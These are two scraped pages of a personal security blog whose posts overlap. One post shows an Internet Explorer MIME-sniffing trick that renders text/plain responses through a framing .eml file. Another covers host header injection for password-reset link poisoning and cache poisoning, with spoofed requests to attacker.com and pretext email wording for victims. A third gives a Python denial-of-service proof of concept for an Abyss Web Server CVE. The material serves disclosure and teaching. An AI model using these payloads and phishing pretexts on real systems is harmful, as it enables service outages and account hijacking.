=== Content from jankopecky.net_487f9102_20250115_174832.html ===

[Skip to content](#content)

[Jan's security blog](https://jankopecky.net/)

Exploits, 0days, fuzzing, web hacking, xss, sqli, olly, IDA, source code review

# Year: 2017

## [[0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)

Hello reader!

It is time for another blogpost! This time it is about a bug I found and I believe it could be quite useful for you someday. It is worth mentioning it affects all versions of IE (tested on win 7, win 8.1 and win 10). It does not affect Edge.

**Ok what is the bug about?**

When server sends back response there are several headers included. One of them is content type. This header tells browser what media type is being returned. [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) has detailed description with examples. The thing which happens quite often when [we do pentesting](https://captes.cz)¬†is that we encounter some¬†pages which lack input validation and output encoding. This means we found [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29) right? Well not really.. Because Content-Type returned says ‚Äútext/plan‚Äù. ¬†This is where the fun ends, because according to these¬†[RFC](https://mimesniff.spec.whatwg.org/#matching-a-mime-type-pattern), [RFC](https://www.ietf.org/rfc/rfc2046.txt)¬†and [this](https://tools.ietf.org/html/draft-abarth-mime-sniff-06) draft, as soon as Content-Type is returned with value text/plain then agent (browser in this case) should jump into binary processing mode. There is no fun in binary mode because it is not scriptable. Let‚Äôs illustrate it with an example. Let‚Äôs have this file called plain.php:

`<?php

header("Content-Type: text/plain");

echo "Hello: ".$_GET["name"];

?>`

As you can see it is super easy example which just takes one parameter. It could be used as playground for xss vulnerabilities, right? Not really! There is first line which says server should return Content-Type header with value ‚Äútext/plain‚Äù. Lets check whether we can inject some harmless HTML.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain.png)

As expected, we can inject whatever we want, but browser will not render/execute it. Reason is obvious, response is of a type text/plain.

**The bug**

I found out if you open .eml file IE¬†will perform mime sniffing and if HTML/JS is recognized in the response it will be rendered/executed. First of all what is EML? It is ‚ÄúMicrosoft Outlook Express mail message‚Äù. This format allows email messages to be saved into file (for example for purpose of archivation). I will not dig deep into this format, if you wanna know more, just check this [RFC](https://www.w3.org/Protocols/rfc822/#z26). This is example of .eml file which you can use for testing:

`root@kali:/var/www/html# cat testeml_1.eml

TESTEML

Content-Type: text/html

Content-Transfer-Encoding: quoted-printable`

`=3Chtml=3Ethis=20is=20test=3C=2Fhtml=3E`

You can save content of this file on your web server and access it with IE (please mind two new lines at the end of the file!). You will see it is rendered properly. BTW pay attention to ‚Äú[Content-Transfer-Encoding: quoted-printable](https://en.wikipedia.org/wiki/Quoted-printable)‚Äù ‚Äì to make it short it is similar to URL encoding except¬†it¬†uses equal sign instead of percentage.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain2.png)

Does not work for you? Haha that is because wrong Content-Type üòâ Correct Content-Type for .eml is ‚Äúmessage/rfc822‚Äù. You can use following .htaccess file:

`root@kali:/var/www/html# cat .htaccess

AddType message/rfc822 .eml`

Screenshot below shows testeml\_1.eml returned with correct Content-Type.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain3.png)

**Finally give us the bug!**

Ok, Ok, from here it is pretty easy to achieve execution of text/plain responses. Let‚Äôs¬†use files from previous examples. The file we are attacking is still plain.php. For attacking purpose we will modify testeml\_1.eml. The payload:

<iframe src=‚Äôplain.php?name=<HTML><h1>it works</h1>‚Äô></iframe>

Which looks like this after encoding:

=3Ciframe=20src=3D=27plain.php=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E

This is how the final file looks like:

`root@kali:/var/www/html# cat testeml_1.eml

TESTEML

Content-Type: text/html

Content-Transfer-Encoding: quoted-printable`

`=3Ciframe=20src=3D=27plain.php=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E`

And this is the result of accessing it in IE:

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain4.png)

You see? Exploitation is sucessful! Although we are framing file with content-type ‚Äútext/plain‚Äù we force IE to perform mime sniffing (that is why <HTML> should be presented in the request/response) and render our payload.

**Defense?**

Best defense is to prevent framing, if you edit the sample file and add¬†header(‚ÄòX-Frame-Options: DENY‚Äô); exploit will fail.

~~I would like to warn about following: setting¬†header(‚ÄòX-Content-Type-Options: nosniff‚Äô); will NOT prevent this attack (good move IE, why would you follow RFC, right?).~~ This cannot be reproduced anymore.

**Conclusion**

I believe conclusion is very important in this case ‚Äì follow defense in depth principle! Yes it does not only apply to infrastructure but also web applications. What defense in depth means? It basically says you should not rely only on one layer of protection but rather apply as many layers as possible. For example when you are securing your windows server you don‚Äôt just install AV and call it a day. You make sure all patches are applied, proper rules are applied through local policies (or domain), default accounts and disabled, etc.

You should take the same approach when securing your web application. Do not only rely on one layer of protection (in this case broken promise that text/plain is not executable) but rather also implement proper input validation and output encoding. Following this approach will minimalize the chance that your whole application will be exposed to major risk in case one layer of protection breaks.

Thank you for reading this post!

Jan

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [April 18, 2017March 16, 2018](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)Tags [0day](https://jankopecky.net/index.php/tag/0day/), [content-type](https://jankopecky.net/index.php/tag/content-type/), [exploit](https://jankopecky.net/index.php/tag/exploit/), [ie](https://jankopecky.net/index.php/tag/ie/), [vulnerability](https://jankopecky.net/index.php/tag/vulnerability/)[6 Comments on [0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/#comments)

## [[Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)

Hello everyone,

I was thinking about what should be my first blog post about. Then I decided that it would be cool to have some articles about not so common vulnerabilities in web application. Everyone knows about [SQL injection](https://www.owasp.org/index.php/SQL_Injection)¬†or [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29). Instead of trying to describe something what has been described 10000 times already I decided to write about not so common flaws.

First of all what a host header is? This header can usually be found in HTTP request, it‚Äôs main purpose is: ‚ÄúThe Host request-header field specifies the Internet host and port number of the resource being requested, as obtained from the original URI given by the user or referring resource‚Äù [RFC2616](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html) says.

**Where is the risk?**

The risk comes from simple truth ‚Äì many sites use value provided in this field and use it later without proper input validation. In many cases this might not have any significant impact but there are other places in the application where accepting arbitrary host header can have pretty bad consequences.

**How do I test for this?**

Easily. You either purchase that awesome tool BurpSuite Pro and install extension called ‚ÄúActive Scan++‚Äù or you can do it old school way with NetCat. For NC testing you can just use this:

NC -vv goodguy.com 80

After connection is established you just write:

`GET / HTTP/1.1

Host: goodguy.com`

Normal response should be received because this is all fine. However connect with netcat and submit following:

`GET / HTTP/1.1

Host: badguy.com`

Was the response same as in previous example? If yes you might just found arbitrary host header vulnerability. Why is this bad? Well because application obviously returned content although we specified invalid/incorrect Host header.

**Ok, but how can I exploit this?**

It really depends on the application logic. If the application does not use this value then there is no risk. Thankfully there is one particular place where this issue can be deadly ‚Äì password reset functionality. It happens a lot when you are resetting forgotten password, application creates link dynamically and use host header provided in request. This happens very often in case of cms developed for masses. It is convenient for developers just to use this header because they don‚Äôt have to hardcode anything. But they forget that everything coming from user can be changed/spoofed/edit so it cannot be trusted (remember this very carefully, it is golden rule in IT security world)!

Some examples:

* <https://www.exploit-db.com/exploits/8196/> ‚Äì WP failed to sanitize host header and BOOM ‚Äì XSS
* <https://packetstormsecurity.com/files/112249/Joomla-2.5.3-Host-Header-Cross-Site-Scripting.html> ‚Äì the same but affecting Joomla

Yes, these examples show how to use Host header attack to do XSS. I promised you some password-reset-link-poisoning so here it comes üôÇ

Recently we (by we I mean my pentesting company <https://captes.cz>) did a pentest for one of our customers. The application had pretty limited functionality so after quick recon we weren‚Äôt really hoping for any high/critical findings. But then we stumbled upon password reset functionality. We quickly validated host header poisoning is possible and aimed for exploitation. It was the case where the application took host value from request header and used it a bit later when putting together password reset link. How did the exploitation go? We just requested page ourcustomer.com/resetpassword.php, there we filled in our email address and clicked on ‚ÄúPassword reset button‚Äù. Our BurpPro was listening so we captured the request which looked like this:

`GET /auth/reset_password?email=pentest@ourcutomer.com

Host: ourcustomer.com

Cookie: ...`

Then we checked mailbox provided by our client ‚Äì we indeed received password reset email which contained typical sentence:

‚ÄúHere is your password reset LINK‚Äù ‚Äì LINK was hyperlink pointing to ourcutomer.com/auth/reset\_password/32493jrfie78434hud20d230942u3d

In this case all is fine and non-malicious at all. If you click this link you will land at our customer web page and you will be prompted for new password. After verifying desired functionality we finally tried attacking the application. We sent request which was very similar to ¬†original one, expect one difference:

`GET /auth/reset_password?email=pentest@ourcutomer.com

Host: captes.cz

Cookie: ...`

Yes you guessed it! We used our own host header. Do you have any idea what happen next? Again we received password reset email, but this time if you looked at the LINK it was pointing to:

![](https://jankopecky.net/wp-content/uploads/2017/02/hostheader.png)

Sorry the email is in Czech but is says: ‚ÄúAnyone asked for new password?‚Äù then some usual phrases and finally link pointing to https://captes.cz/auth/reset\_password/2398n4c324mx032948nv2309n4x20m

This is awesome, isn‚Äôt it? We can send email to arbitrary user of the application and make sure his password reset link will be poisoned. As soon as victim clicks the link his token appears in our logs ‚Äì that‚Äôs it ‚Äì game over for victim, we can hijack the account.

Here are some thoughts to increase a chances of this attack being successful:

* A user is most probably not gonna click the link because he did not ask for password reset. Well there comes social engineering to rescue! You can be creative and come up with your own reason why he should click. Our first email to victim had following idea: ‚ÄúDear client, unfortunately we have to inform you our systems have been breached and there is high chance password leaked as well. To deny attacker accessing your webpage with leaked password you have to reset your current password. Reset link will be sent to your email address in a few minutes‚Äù. Right after you send¬†this email you can send the poisoned one. Of course better your social engineering email is higher are chances user clicks the link.
* After user clicks password reset link and lands at your web page make sure you just don‚Äôt leave him there because he might get suspicious like ‚Äúdude what is going on? I clicked on password reset link and ended up on completely different domain‚Äù. This would screw up your attack for sure. As soon as you have the access token just redirect user back where he should have landed originally.

So far we have covered two cases ‚Äì XSS and password reset link poisoning. There is one more options I want to cover here. It it cache poisoning. To understand this issue it is important to understand how many devices/software look at your request along it‚Äôs way from browser to server (now I‚Äôm only speaking about [layer 7](https://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29)). When your request is making it‚Äôs way across network there usually are proxies, WAFs, load balancers and of course the server itself. The problem here is inconsistency. ¬†Let‚Äôs take example from past. There is one caching solution called Varnish, when Varnish receives HTTP request which looks like this:

`GET /index.html HTTP/1.1

Host: attacker.com

Host: goodguy.com`

guess which header it is gonna take as more significant? It is first header. What happens when this request arrives to ngix server? Well ngix prefers the last host header‚Ä¶ you see where this is going? Imagine your company use Varnish as caching solution and you have colleague who likes pranks. What happens if your funny friend send the following request:

`nc -nvv attacker.com

GET /index.html HTTP/1.1

Host: myfavouritewebpage.com

Host: attacker.com`

Correct ‚Äì this request leaves your company network and Varnish will cache the response as it was for myfavouritewebpage.com. Ngix on the other hand sees valid attacker.com and will return it‚Äôs context. This means your company‚Äôs Varnish cache will be poisoned in such a way that when someone writes myfavouritewebpae.com to his browser content of attacker.com is returned.

That is pretty much all folks. Just one more thing, references:

<http://seclists.org/fulldisclosure/2008/Jun/169> ‚Äì this is (at least to my knowledge) very first reported abuse of host header

<http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html>¬†‚Äì very informative article about this topic

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [February 23, 2017](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)[Leave a comment on [Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/#respond)

## Recent Posts

* [CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)
* [[0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)
* [[Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)
* [Hello world!](https://jankopecky.net/index.php/2016/09/24/hello-world/)
## Archives

* [April 2021](https://jankopecky.net/index.php/2021/04/)
* [April 2017](https://jankopecky.net/index.php/2017/04/)
* [February 2017](https://jankopecky.net/index.php/2017/02/)
* [September 2016](https://jankopecky.net/index.php/2016/09/)
## Categories

* [Uncategorized](https://jankopecky.net/index.php/category/uncategorized/)
## Pages

* [About](https://jankopecky.net/index.php/sample-page/)

[Jan's security blog](https://jankopecky.net/)
[Proudly powered by WordPress](https://wordpress.org/)



=== Content from jankopecky.net_b1217b72_20250115_174833.html ===

[Skip to content](#content)
# [Jan's security blog](https://jankopecky.net/)

Exploits, 0days, fuzzing, web hacking, xss, sqli, olly, IDA, source code review

## [CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)

Hello,

recently I spent some time working on my HTTP fuzzer. Running it against affected version of Abyss Web Server it was possible to cause Denial of Service attack (the application crashed). Based on my analysis the bug is not exploitable.

**Crash**:

Crash details:

```
(4768.5728): Access violation ‚Äì code c0000005 (first chance)

First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

*** ERROR: Module load completed but symbols could not be loaded for C:\Abyss Web Server\abyssws.exe

abyssws+0x807db:

00000000`004807db 8a4601          mov     al,byte ptr [rsi+1] ds:00000000`0489b000=??

0:016> r

rax=0000000000000000 rbx=00000000076b3818 rcx=00000000053bfba0

rdx=0000000004899da8 rsi=000000000489afff rdi=0000000004899d38

rip=00000000004807db rsp=00000000053bfb00 rbp=0000000000000000

r8=0000000004899a08  r9=0000000000000000 r10=00000000004dbb72

r11=0000000004899d22 r12=00000000053bfba0 r13=00000000076b37c8

r14=0000000000000000 r15=0000000005db1f18

iopl=0         nv up ei ng nz ac pe cy

cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293

abyssws+0x807db:

00000000`004807db 8a4601          mov     al,byte ptr [rsi+1] ds:00000000`0489b000=??
```

**(ugly and dirty) PoC:**

```
from threading import Thread

import requests

import socket

def cause_dos():

    for x in range(0,500):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((‚Äú192.168.65.128‚Äù , 80))

        pingdata = ‚Äú‚Äù‚ÄùGET /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// HTTP/1.1\r

Accept: text/plain\r

Connection: Close\r

If-Modified-Since: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\r

Host: 192.168.65.128\r\n\r\n‚Äù‚Äù‚Äù

        data = pingdata.encode()

        s.sendall(data)

# Start all threads.

threads = []

for n in range(1,3):

    t = Thread(target=cause_dos)

    t.start()

    threads.append(t)

# Wait all threads to finish.

for t in threads:

    t.join()
```

The problem is located in code which is responsible for parsing ‚ÄúIf-Modified-Since‚Äù header.

Vendor was informed about this bug and we agreed not to release technical details before oficial patch is out. Props to Abyss security team for handling this report with care.

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [April 8, 2021May 18, 2021](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)[Leave a comment on CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/#respond)

## [[0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)

Hello reader!

It is time for another blogpost! This time it is about a bug I found and I believe it could be quite useful for you someday. It is worth mentioning it affects all versions of IE (tested on win 7, win 8.1 and win 10). It does not affect Edge.

**Ok what is the bug about?**

When server sends back response there are several headers included. One of them is content type. This header tells browser what media type is being returned. [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) has detailed description with examples. The thing which happens quite often when [we do pentesting](https://captes.cz)¬†is that we encounter some¬†pages which lack input validation and output encoding. This means we found [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29) right? Well not really.. Because Content-Type returned says ‚Äútext/plan‚Äù. ¬†This is where the fun ends, because according to these¬†[RFC](https://mimesniff.spec.whatwg.org/#matching-a-mime-type-pattern), [RFC](https://www.ietf.org/rfc/rfc2046.txt)¬†and [this](https://tools.ietf.org/html/draft-abarth-mime-sniff-06) draft, as soon as Content-Type is returned with value text/plain then agent (browser in this case) should jump into binary processing mode. There is no fun in binary mode because it is not scriptable. Let‚Äôs illustrate it with an example. Let‚Äôs have this file called plain.php:

`<?php

header("Content-Type: text/plain");

echo "Hello: ".$_GET["name"];

?>`

As you can see it is super easy example which just takes one parameter. It could be used as playground for xss vulnerabilities, right? Not really! There is first line which says server should return Content-Type header with value ‚Äútext/plain‚Äù. Lets check whether we can inject some harmless HTML.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain.png)

As expected, we can inject whatever we want, but browser will not render/execute it. Reason is obvious, response is of a type text/plain.

**The bug**

I found out if you open .eml file IE¬†will perform mime sniffing and if HTML/JS is recognized in the response it will be rendered/executed. First of all what is EML? It is ‚ÄúMicrosoft Outlook Express mail message‚Äù. This format allows email messages to be saved into file (for example for purpose of archivation). I will not dig deep into this format, if you wanna know more, just check this [RFC](https://www.w3.org/Protocols/rfc822/#z26). This is example of .eml file which you can use for testing:

`root@kali:/var/www/html# cat testeml_1.eml

TESTEML

Content-Type: text/html

Content-Transfer-Encoding: quoted-printable`

`=3Chtml=3Ethis=20is=20test=3C=2Fhtml=3E`

You can save content of this file on your web server and access it with IE (please mind two new lines at the end of the file!). You will see it is rendered properly. BTW pay attention to ‚Äú[Content-Transfer-Encoding: quoted-printable](https://en.wikipedia.org/wiki/Quoted-printable)‚Äù ‚Äì to make it short it is similar to URL encoding except¬†it¬†uses equal sign instead of percentage.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain2.png)

Does not work for you? Haha that is because wrong Content-Type üòâ Correct Content-Type for .eml is ‚Äúmessage/rfc822‚Äù. You can use following .htaccess file:

`root@kali:/var/www/html# cat .htaccess

AddType message/rfc822 .eml`

Screenshot below shows testeml\_1.eml returned with correct Content-Type.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain3.png)

**Finally give us the bug!**

Ok, Ok, from here it is pretty easy to achieve execution of text/plain responses. Let‚Äôs¬†use files from previous examples. The file we are attacking is still plain.php. For attacking purpose we will modify testeml\_1.eml. The payload:

<iframe src=‚Äôplain.php?name=<HTML><h1>it works</h1>‚Äô></iframe>

Which looks like this after encoding:

=3Ciframe=20src=3D=27plain.php=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E

This is how the final file looks like:

`root@kali:/var/www/html# cat testeml_1.eml

TESTEML

Content-Type: text/html

Content-Transfer-Encoding: quoted-printable`

`=3Ciframe=20src=3D=27plain.php=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E`

And this is the result of accessing it in IE:

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain4.png)

You see? Exploitation is sucessful! Although we are framing file with content-type ‚Äútext/plain‚Äù we force IE to perform mime sniffing (that is why <HTML> should be presented in the request/response) and render our payload.

**Defense?**

Best defense is to prevent framing, if you edit the sample file and add¬†header(‚ÄòX-Frame-Options: DENY‚Äô); exploit will fail.

~~I would like to warn about following: setting¬†header(‚ÄòX-Content-Type-Options: nosniff‚Äô); will NOT prevent this attack (good move IE, why would you follow RFC, right?).~~ This cannot be reproduced anymore.

**Conclusion**

I believe conclusion is very important in this case ‚Äì follow defense in depth principle! Yes it does not only apply to infrastructure but also web applications. What defense in depth means? It basically says you should not rely only on one layer of protection but rather apply as many layers as possible. For example when you are securing your windows server you don‚Äôt just install AV and call it a day. You make sure all patches are applied, proper rules are applied through local policies (or domain), default accounts and disabled, etc.

You should take the same approach when securing your web application. Do not only rely on one layer of protection (in this case broken promise that text/plain is not executable) but rather also implement proper input validation and output encoding. Following this approach will minimalize the chance that your whole application will be exposed to major risk in case one layer of protection breaks.

Thank you for reading this post!

Jan

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [April 18, 2017March 16, 2018](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)Tags [0day](https://jankopecky.net/index.php/tag/0day/), [content-type](https://jankopecky.net/index.php/tag/content-type/), [exploit](https://jankopecky.net/index.php/tag/exploit/), [ie](https://jankopecky.net/index.php/tag/ie/), [vulnerability](https://jankopecky.net/index.php/tag/vulnerability/)[6 Comments on [0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/#comments)

## [[Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)

Hello everyone,

I was thinking about what should be my first blog post about. Then I decided that it would be cool to have some articles about not so common vulnerabilities in web application. Everyone knows about [SQL injection](https://www.owasp.org/index.php/SQL_Injection)¬†or [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29). Instead of trying to describe something what has been described 10000 times already I decided to write about not so common flaws.

First of all what a host header is? This header can usually be found in HTTP request, it‚Äôs main purpose is: ‚ÄúThe Host request-header field specifies the Internet host and port number of the resource being requested, as obtained from the original URI given by the user or referring resource‚Äù [RFC2616](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html) says.

**Where is the risk?**

The risk comes from simple truth ‚Äì many sites use value provided in this field and use it later without proper input validation. In many cases this might not have any significant impact but there are other places in the application where accepting arbitrary host header can have pretty bad consequences.

**How do I test for this?**

Easily. You either purchase that awesome tool BurpSuite Pro and install extension called ‚ÄúActive Scan++‚Äù or you can do it old school way with NetCat. For NC testing you can just use this:

NC -vv goodguy.com 80

After connection is established you just write:

`GET / HTTP/1.1

Host: goodguy.com`

Normal response should be received because this is all fine. However connect with netcat and submit following:

`GET / HTTP/1.1

Host: badguy.com`

Was the response same as in previous example? If yes you might just found arbitrary host header vulnerability. Why is this bad? Well because application obviously returned content although we specified invalid/incorrect Host header.

**Ok, but how can I exploit this?**

It really depends on the application logic. If the application does not use this value then there is no risk. Thankfully there is one particular place where this issue can be deadly ‚Äì password reset functionality. It happens a lot when you are resetting forgotten password, application creates link dynamically and use host header provided in request. This happens very often in case of cms developed for masses. It is convenient for developers just to use this header because they don‚Äôt have to hardcode anything. But they forget that everything coming from user can be changed/spoofed/edit so it cannot be trusted (remember this very carefully, it is golden rule in IT security world)!

Some examples:

* <https://www.exploit-db.com/exploits/8196/> ‚Äì WP failed to sanitize host header and BOOM ‚Äì XSS
* <https://packetstormsecurity.com/files/112249/Joomla-2.5.3-Host-Header-Cross-Site-Scripting.html> ‚Äì the same but affecting Joomla

Yes, these examples show how to use Host header attack to do XSS. I promised you some password-reset-link-poisoning so here it comes üôÇ

Recently we (by we I mean my pentesting company <https://captes.cz>) did a pentest for one of our customers. The application had pretty limited functionality so after quick recon we weren‚Äôt really hoping for any high/critical findings. But then we stumbled upon password reset functionality. We quickly validated host header poisoning is possible and aimed for exploitation. It was the case where the application took host value from request header and used it a bit later when putting together password reset link. How did the exploitation go? We just requested page ourcustomer.com/resetpassword.php, there we filled in our email address and clicked on ‚ÄúPassword reset button‚Äù. Our BurpPro was listening so we captured the request which looked like this:

`GET /auth/reset_password?email=pentest@ourcutomer.com

Host: ourcustomer.com

Cookie: ...`

Then we checked mailbox provided by our client ‚Äì we indeed received password reset email which contained typical sentence:

‚ÄúHere is your password reset LINK‚Äù ‚Äì LINK was hyperlink pointing to ourcutomer.com/auth/reset\_password/32493jrfie78434hud20d230942u3d

In this case all is fine and non-malicious at all. If you click this link you will land at our customer web page and you will be prompted for new password. After verifying desired functionality we finally tried attacking the application. We sent request which was very similar to ¬†original one, expect one difference:

`GET /auth/reset_password?email=pentest@ourcutomer.com

Host: captes.cz

Cookie: ...`

Yes you guessed it! We used our own host header. Do you have any idea what happen next? Again we received password reset email, but this time if you looked at the LINK it was pointing to:

![](https://jankopecky.net/wp-content/uploads/2017/02/hostheader.png)

Sorry the email is in Czech but is says: ‚ÄúAnyone asked for new password?‚Äù then some usual phrases and finally link pointing to https://captes.cz/auth/reset\_password/2398n4c324mx032948nv2309n4x20m

This is awesome, isn‚Äôt it? We can send email to arbitrary user of the application and make sure his password reset link will be poisoned. As soon as victim clicks the link his token appears in our logs ‚Äì that‚Äôs it ‚Äì game over for victim, we can hijack the account.

Here are some thoughts to increase a chances of this attack being successful:

* A user is most probably not gonna click the link because he did not ask for password reset. Well there comes social engineering to rescue! You can be creative and come up with your own reason why he should click. Our first email to victim had following idea: ‚ÄúDear client, unfortunately we have to inform you our systems have been breached and there is high chance password leaked as well. To deny attacker accessing your webpage with leaked password you have to reset your current password. Reset link will be sent to your email address in a few minutes‚Äù. Right after you send¬†this email you can send the poisoned one. Of course better your social engineering email is higher are chances user clicks the link.
* After user clicks password reset link and lands at your web page make sure you just don‚Äôt leave him there because he might get suspicious like ‚Äúdude what is going on? I clicked on password reset link and ended up on completely different domain‚Äù. This would screw up your attack for sure. As soon as you have the access token just redirect user back where he should have landed originally.

So far we have covered two cases ‚Äì XSS and password reset link poisoning. There is one more options I want to cover here. It it cache poisoning. To understand this issue it is important to understand how many devices/software look at your request along it‚Äôs way from browser to server (now I‚Äôm only speaking about [layer 7](https://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29)). When your request is making it‚Äôs way across network there usually are proxies, WAFs, load balancers and of course the server itself. The problem here is inconsistency. ¬†Let‚Äôs take example from past. There is one caching solution called Varnish, when Varnish receives HTTP request which looks like this:

`GET /index.html HTTP/1.1

Host: attacker.com

Host: goodguy.com`

guess which header it is gonna take as more significant? It is first header. What happens when this request arrives to ngix server? Well ngix prefers the last host header‚Ä¶ you see where this is going? Imagine your company use Varnish as caching solution and you have colleague who likes pranks. What happens if your funny friend send the following request:

`nc -nvv attacker.com

GET /index.html HTTP/1.1

Host: myfavouritewebpage.com

Host: attacker.com`

Correct ‚Äì this request leaves your company network and Varnish will cache the response as it was for myfavouritewebpage.com. Ngix on the other hand sees valid attacker.com and will return it‚Äôs context. This means your company‚Äôs Varnish cache will be poisoned in such a way that when someone writes myfavouritewebpae.com to his browser content of attacker.com is returned.

That is pretty much all folks. Just one more thing, references:

<http://seclists.org/fulldisclosure/2008/Jun/169> ‚Äì this is (at least to my knowledge) very first reported abuse of host header

<http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html>¬†‚Äì very informative article about this topic

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [February 23, 2017](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)[Leave a comment on [Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/#respond)

## [Hello world!](https://jankopecky.net/index.php/2016/09/24/hello-world/)

Hello everyone, it‚Äôs Jan. I have heard it is quite cool to have your own blog nowadays so I would like to start my own. As you might know I‚Äôm security specialist (mostly focusing on web app security, exploitation, RE, malware analysis and red teaming activity). I will try to blog about interesting vulnerabilities I have encountered during my testing.

I hope you like it. Feel free to follow me @rnmx123

Thank you,

Jan

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [September 24, 2016February 6, 2017](https://jankopecky.net/index.php/2016/09/24/hello-world/)[1 Comment on Hello world!](https://jankopecky.net/index.php/2016/09/24/hello-world/#comments)

## Recent Posts

* [CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)
